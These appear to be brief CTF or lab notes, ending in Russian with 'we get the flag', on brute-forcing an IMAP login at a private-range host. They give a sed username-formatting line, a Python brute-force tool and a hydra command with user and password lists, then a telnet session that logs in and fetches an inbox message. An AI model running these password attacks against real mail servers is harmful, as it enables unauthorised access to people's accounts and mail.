sed -i 's/$/@company.local/' input.txt
python3 main.py ([GitHub - Gill-Singh-A/IMAP-Brute-Force: A Python Program that uses imaplib module to brute force IMAP (Internet Messaging Access Protocol)](https://github.com/Gill-Singh-A/IMAP-Brute-Force)) -s 10.10.0.48 -u user.txt -P pass.txt -S False -p 143 


hydra -L name.txt -P pass.txt imap://10.10.0.48 -u -V

telnet 10.10.0.48 143
```
<RandomStringID> <command> [<arg1><arg2>…]
```
1 LOGIN user pass
2 EXAMINE INBOX
3 FETCH 1 BODY[]
получаем флаг